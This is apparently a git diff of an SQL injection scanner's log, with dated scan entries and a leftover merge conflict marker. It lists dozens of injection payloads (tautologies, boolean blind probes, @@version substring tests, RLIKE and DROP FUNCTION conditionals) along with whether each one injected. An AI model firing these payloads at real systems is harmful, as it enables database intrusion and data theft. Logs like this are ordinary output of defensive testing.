@@ -1,62 +1,4 @@
-## Date: 04-02-2024 ~ Time: 00:24:33 ##
---------------------------------------------------
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: <'>
-__________________________________________________
-Scan Result: False
-Scan Description: Tried payload: <1> was not able to  inject.
-__________________________________________________
-## Date: 04-02-2024 ~ Time: 00:25:28 ##
---------------------------------------------------
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: <'>.
-__________________________________________________
-Scan Result: False
-Scan Description: The payload <1> was not injected.
-__________________________________________________
-## Date: 04-02-2024 ~ Time: 00:44:36 ##
---------------------------------------------------
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: <'>.
-__________________________________________________
-Scan Result: False
-Scan Description: The payload <1> was not injected.
-__________________________________________________
-<<<<<<< HEAD
-## Date: 08-02-2024 ~ Time: 19:24:02 ##
-=======
-## Date: 04-02-2024 ~ Time: 02:50:15 ##
---------------------------------------------------
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: <'>.
-__________________________________________________
-Scan Result: False
-Scan Description: The payload <1> was not injected.
-__________________________________________________
-## Date: 04-02-2024 ~ Time: 02:51:14 ##
---------------------------------------------------
-Scan Result: False
-Scan Description: The payload < OR 1=1> was not injected.
-__________________________________________________
-Scan Result: False
-Scan Description: The payload < OR 1=0> was not injected.
-__________________________________________________
-Scan Result: False
-Scan Description: The payload < OR x=x> was not injected.
-__________________________________________________
-Scan Result: False
-Scan Description: The payload < OR x=y> was not injected.
-__________________________________________________
-Scan Result: False
-Scan Description: The payload < OR 1=1#> was not injected.
-__________________________________________________
-Scan Result: False
-Scan Description: The payload < OR 1=0#> was not injected.
-## Date: 17-02-2024 ~ Time: 22:21:25 ##
+## Date: 19-03-2024 ~ Time: 00:51:47 ##
 --------------------------------------------------
 Scan Result: False
 Scan Description: The payload < OR 1=1> was not injected.
@@ -94,13 +36,11 @@ __________________________________________________
 Scan Result: False
 Scan Description: The payload < OR x=y-- > was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < OR 3409=3409 AND ('pytW' LIKE 'pytW>.
+Scan Result: False
+Scan Description: The payload < OR 3409=3409 AND ('pytW' LIKE 'pytW> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < OR 3409=3409 AND ('pytW' LIKE 'pytY>.
+Scan Result: False
+Scan Description: The payload < OR 3409=3409 AND ('pytW' LIKE 'pytY> was not injected.
 __________________________________________________
 Scan Result: False
 Scan Description: The payload < HAVING 1=1> was not injected.
@@ -138,13 +78,11 @@ __________________________________________________
 Scan Result: False
 Scan Description: The payload < AND 1=0#> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < AND 1=1 AND '%'='>.
+Scan Result: False
+Scan Description: The payload < AND 1=1 AND '%'='> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < AND 1=0 AND '%'='>.
+Scan Result: False
+Scan Description: The payload < AND 1=0 AND '%'='> was not injected.
 __________________________________________________
 Scan Result: False
 Scan Description: The payload < AND 1083=1083 AND (1427=1427> was not injected.
@@ -152,29 +90,23 @@ __________________________________________________
 Scan Result: False
 Scan Description: The payload < AND 7506=9091 AND (5913=5913> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < AND 1083=1083 AND ('1427=1427>.
+Scan Result: False
+Scan Description: The payload < AND 1083=1083 AND ('1427=1427> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < AND 7506=9091 AND ('5913=5913>.
+Scan Result: False
+Scan Description: The payload < AND 7506=9091 AND ('5913=5913> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < AND 7300=7300 AND 'pKlZ'='pKlZ>.
+Scan Result: False
+Scan Description: The payload < AND 7300=7300 AND 'pKlZ'='pKlZ> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < AND 7300=7300 AND 'pKlZ'='pKlY>.
+Scan Result: False
+Scan Description: The payload < AND 7300=7300 AND 'pKlZ'='pKlY> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < AND 7300=7300 AND ('pKlZ'='pKlZ>.
+Scan Result: False
+Scan Description: The payload < AND 7300=7300 AND ('pKlZ'='pKlZ> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < AND 7300=7300 AND ('pKlZ'='pKlY>.
+Scan Result: False
+Scan Description: The payload < AND 7300=7300 AND ('pKlZ'='pKlY> was not injected.
 __________________________________________________
 Scan Result: False
 Scan Description: The payload < AS INJECTX WHERE 1=1 AND 1=1> was not injected.
@@ -491,13 +423,11 @@ __________________________________________________
 Scan Result: False
 Scan Description: The payload < ORDER BY 31337 > was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+Scan Result: False
+Scan Description: The payload < RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+Scan Result: False
+Scan Description: The payload < RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='> was not injected.
 __________________________________________________
 Scan Result: False
 Scan Description: The payload <IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
@@ -511,37 +441,30 @@ __________________________________________________
 Scan Result: False
 Scan Description: The payload <%' AND 8310=8311 AND '%'='> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < and (select substring(@@version,1,1))='X'>.
+Scan Result: False
+Scan Description: The payload < and (select substring(@@version,1,1))='X'> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < and (select substring(@@version,1,1))='M'>.
+Scan Result: False
+Scan Description: The payload < and (select substring(@@version,1,1))='M'> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < and (select substring(@@version,2,1))='i'>.
+Scan Result: False
+Scan Description: The payload < and (select substring(@@version,2,1))='i'> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < and (select substring(@@version,2,1))='y'>.
+Scan Result: False
+Scan Description: The payload < and (select substring(@@version,2,1))='y'> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < and (select substring(@@version,3,1))='c'>.
+Scan Result: False
+Scan Description: The payload < and (select substring(@@version,3,1))='c'> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < and (select substring(@@version,3,1))='S'>.
+Scan Result: False
+Scan Description: The payload < and (select substring(@@version,3,1))='S'> was not injected.
 __________________________________________________
-Scan Result: True
-Scan Description: Website is vulnerable to Error based SQL Injection attack!
-Injected payload: < and (select substring(@@version,3,1))='X'>.
+Scan Result: False
+Scan Description: The payload < and (select substring(@@version,3,1))='X'> was not injected.
 __________________________________________________
-## Date: 17-02-2024 ~ Time: 22:40:54 ##
+## Date: 19-03-2024 ~ Time: 00:52:45 ##
 --------------------------------------------------
-## Date: 17-02-2024 ~ Time: 22:59:18 ##
+## Date: 19-03-2024 ~ Time: 00:52:55 ##
 --------------------------------------------------
 Scan Result: False
 Scan Description: The payload < OR 1=1> was not injected.
